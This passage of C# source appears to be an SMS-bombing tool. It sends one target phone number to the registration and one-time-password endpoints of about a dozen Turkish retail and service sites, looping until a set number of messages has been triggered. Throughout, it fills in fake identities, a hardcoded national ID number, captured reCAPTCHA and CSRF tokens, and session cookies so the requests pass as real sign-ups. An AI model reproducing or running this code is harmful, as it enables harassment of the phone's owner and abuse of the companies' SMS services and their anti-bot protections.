                HttpResponseMessage response = await client.PostAsync("https://www.defacto.com.tr/Customer/SendRegisterPhoneConfirmationSms", formContent);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] defacto.com.tr ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] defacto.com.tr :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //englishhome.com
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                var formContent = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("top_name", "ryan"),
                    new KeyValuePair<string, string>("last_name", "gosling"),
                    new KeyValuePair<string, string>("email", GenerateRandomString()+"@hotmail.com"),
                    new KeyValuePair<string, string>("phone", "0" + phone),
                    new KeyValuePair<string, string>("password", "Tyler0216"),
                    new KeyValuePair<string, string>("tom_pay_allowed", "true"),
                    new KeyValuePair<string, string>("confirm", "true"),
                    new KeyValuePair<string, string>("csrfmiddlewaretoken", "WimFOnYz47gGnbAHPs4FM3XMP3fZDGAI6WmfZCIrVHUIPS1y7sBvhnvjuGMNnMOj"),
                });
                formContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-www-form-urlencoded");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://www.englishhome.com/enh_app/users/registration/", formContent);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] englishhome.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] englishhome.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //migros.com.tr
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"phoneNumber\":\"" + phone + "\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://www.migros.com.tr/rest/users/login/otp?reid=1694692505489000047", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] migros.com.tr ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] migros.com.tr :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //tıklagelsin.com
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"operationName\":\"GENERATE_OTP\",\"variables\":{\"phone\":\"+90" + phone + "\",\"challenge\":\"82b55172-8b79-4564-b555-605693208b15\",\"deviceUniqueId\":\"web_76003c51-7d12-443d-9848-f8a032b54746\"},\"query\":\"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\\n  generateOtp(\\n    phone: $phone\\n    challenge: $challenge\\n    deviceUniqueId: $deviceUniqueId\\n  )\\n}\\n\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://www.tiklagelsin.com/user/graphql", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] tıklagelsin.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] tıklagelsin.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }

            //istegelsin.com
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"query\":\"\\n        mutation SendOtp2($phoneNumber: String!) {\\n          sendOtp2(phoneNumber: $phoneNumber) {\\n            alreadySent\\n            remainingTime\\n          }\\n        }\",\"variables\":{\"phoneNumber\":\"90" + phone + "\"}}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://prod.fasapi.net/", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] istegelsin.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] istegelsin.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //wmf.com.tr
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"top_name\":\"ryan\",\"last_name\":\"gosling\",\"email\":\"" + GenerateRandomString() + "@hotmail.com\",\"phone\":\"05510123211\",\"gender\":\"male\",\"date_of_birth\":\"2000-09-14\",\"password\":\"Tyler0216\",\"confirm\":\"true\",\"kvkk_agreement\":\"true\",\"phone\":\"0" + phone + "\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://www.wmf.com.tr/users/register/", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] wmf.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] wmf.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }

            //naosstars.com
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"type\":\"register\",\"top_name\":\"ryan\",\"last_name\":\"gosling\",\"email\":\"" + GenerateRandomString() + "@hotmiak.com\",\"new_password\":\"Tyler0216\",\"invitation_code\":\"\",\"kvkk\":\"1\",\"user_check\":\"1\",\"telephone\":\"(+90)" + phone.Substring(0, 3) + "-" + phone.Substring(3, 3) + "-" + phone.Substring(6, 2) + "-" + phone.Substring(8, 2) + "\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://naosstars.com/api/smsSend/e6fac1fd-a28c-4f59-82f1-e00d768536b4", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] naosstars.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] naosstars.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //dsmart
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"CodeType\":\"PreVerification\",\"Method\":\"Sms\",\"Language\":\"TR\",\"Mobile\":\"+90" + phone + "\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://api-crm4.ercdn.com/membership/verification/send?key=ac3f095f717f2665f3e8787d8f62ebc1", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] dsmart.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] dsmart.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //kigili
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                var formContent = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("top_name", "ryan"),
                    new KeyValuePair<string, string>("last_name", "gosling"),
                    new KeyValuePair<string, string>("email", GenerateRandomString() + "@hotmail.com"),
                    new KeyValuePair<string, string>("phone", "0" + phone),
                    new KeyValuePair<string, string>("password", "Tyler0216"),
                    new KeyValuePair<string, string>("email_allowed", "true"),
                    new KeyValuePair<string, string>("sms_allowed", "true"),
                    new KeyValuePair<string, string>("confirm", "true"),
                    new KeyValuePair<string, string>("kvkk", "true"),
                    new KeyValuePair<string, string>("next", "\\"),
                    new KeyValuePair<string, string>("g-recaptcha-response", "03AFcWeA7mKmA88xgg-JYL0CGsdt_p0P06zwA2cWqiNCMdttYIOL1OdhOkBEtZRidc8VeNrhUmLG5Ce0uvxj4-Xx0X2Ki6VMRu0XeTJEtDe3tyxUVj2s6c6uxyep_hDhujWMcccrdmKT4Yaa8lD1joJqugks-EVoqzDK_VI4zPtBEMRYz03jzvrYN2oqY5ABaBEdqP0micZg1hRXDT6GXJQEfBslVe0zngx0gfnsgAheNkH_ZTnlzmUO2a9Abh6AVc60ANHNB_MoUOKwgWId8QerrV5OqPcU1MaHL6qErzBYgbzzGo6ddfa4EyBttDRbeAn0-UtBGrTwuaaoITsHMfc30F1lAVJy2wfnjoArhLYYIrmTppBhIvEmOCCGAcTtcf-v3VsBqbY_Vwx85y2Deqj_alSMH8m4CA0UME8RMCKmXH9TWFoAryYh-nnmLpkWiQsEnWJkA5BLFoVWthNL4GH3SAzCxhhFKu5Imvtg1K3D7zS0nNM3XZBMfhansnKZzNzHpdnasde2qsIRCG7iO5LdCJBpkUd6_vUgvdpQv77H35AFTRpNrUwNU"),
                });
                formContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-www-form-urlencoded");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://www.kigili.com/users/registration/", formContent);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] kigili.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] kigili.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //kahvedunyası
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"token_type\":\"register_token\",\"mobile_number\":\"" + phone + "\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://core.kahvedunyasi.com/api/users/sms/send", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] kahvedunyasi.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] kahvedunyasi.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //a101
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                var formContent = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("next", "\\"),
                    new KeyValuePair<string, string>("phone", "0" + phone),
                });
                formContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-www-form-urlencoded");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                HttpResponseMessage response = await client.PostAsync("https://www.a101.com.tr/users/otp-login/", formContent);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] a101.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] a101.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //www.anadolu.com.tr
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
                {
                    var formContent = new FormUrlEncodedContent(new[]
    {
                    new KeyValuePair<string, string>("ceptelefon", "(" + phone.Substring(0, 3) + ")" + " " + phone.Substring(3,3) + " " + phone.Substring(6,2) + " " + phone.Substring(8, 2)),
                    new KeyValuePair<string, string>("tc", "55439154161"),
                    new KeyValuePair<string, string>("adsoyad", "Ryan Gosling"),
                    new KeyValuePair<string, string>("email", GenerateRandomString() +"@hotmail.com"),
                    new KeyValuePair<string, string>("gun", "03"),
                    new KeyValuePair<string, string>("ay", "02"),
                    new KeyValuePair<string, string>("yil", "2000"),
                    new KeyValuePair<string, string>("cinsiyet", "E"),
                    new KeyValuePair<string, string>("il", "ADANA"),
                    new KeyValuePair<string, string>("ogrenimdurumu", "LISANS USTU"),
                    new KeyValuePair<string, string>("iletisimkanali", "4"),
                    new KeyValuePair<string, string>("kvkkonay", "on"),
                    new KeyValuePair<string, string>("g-recaptcha-response", "03AFcWeA7mumlTz1ueStRPn_cUtph6pndiUeUD1cQeZlJ0inp20l_c8SRFK4cGhBJWEoG4_rFam7SUzxkaYSXmEoQgQdgr2kC1BueAJY92AzfeqbpCMl-NquZcMKthcVv89ygXJs_30wTXL0kZdaBeB_AjALgaEc7vM5n58O1kJxSg1AYs5pNLVf1_S85bubZ6cbX--0WmihBBVoS7zoTsXKhIR4L_GP-s7j_oojD7-_2CtJkgC6Jurvbi-GVQLIriV3F_z668k1z7oU6w8aMmozAzn_LR-gdtCrI6_XTIZQ297Pc5deLAYto1nSB21NYXnDcBb7XJ7VHYNA4-7A851oyvK-XIPJK_Rj8culkij2fPEzud1qvkt8Rg05bT54_1VFqN5affrJJZXQvEqJrrVzBnsbNgTNvgErV11SW-0eRnf5Sj0Eeue3jCq-hxlT2tul2-Rac0NCjWkvTnEvVYifla5ymC-NIzHaU83KuPw3_sctIwAHhSnKV4bBkWFZ25WN0tHftbq8rjNHdLdrZuCAHtZTl3T8b7BHxEw-prI1wh-6azMmFK798"),
                });
                    formContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-www-form-urlencoded");
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Origin", "https://www.anadolu.com.tr");
                    client.DefaultRequestHeaders.Add("Referer", "https://www.anadolu.com.tr/UyeOl");
                    client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                    client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                    client.DefaultRequestHeaders.Add("Cookie", "PHPSESSID=8bgsf7u76kuqt8tl0rhoobu1h4; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22diger%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222023-09-14T16%3A33%3A38.947Z%22%2C%22consentId%22%3A%228647412d-164a-4129-943f-f210fcaea30a%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22diger%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22islev%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222023-09-14T16%3A33%3A38.947Z%22%7D");
                    client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                    client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");
                    client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
                    client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                    client.DefaultRequestHeaders.Add("Sec-Fetch-User", "?1");
                    client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
                    HttpResponseMessage response = await client.PostAsync("https://www.anadolu.com.tr/Uye_Ol.php", formContent);
                    if (response.IsSuccessStatusCode)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[+] Anadolu.com.tr ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                        sent++;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[x] Anadolu.com.tr :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    }
                }
            if (sent >= shouldsent)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("\n███████╗███████╗\r\n██╔════╝╚══███╔╝\r\n█████╗    ███╔╝ \r\n██╔══╝   ███╔╝  \r\n███████╗███████╗\r\n╚══════╝╚══════╝\r\n                \r\n");
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.WriteLine("Tekrar gönder : 1\nÇıkış Yap : 2\n");
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                int choose = Convert.ToInt32(Console.ReadLine());
                if (choose == 1)
                {
                    sent = 0;
                    goto top;
                }
                else
                    Environment.Exit(0);
            }
            else
                goto top;
            Console.ReadLine();
        }
    }
}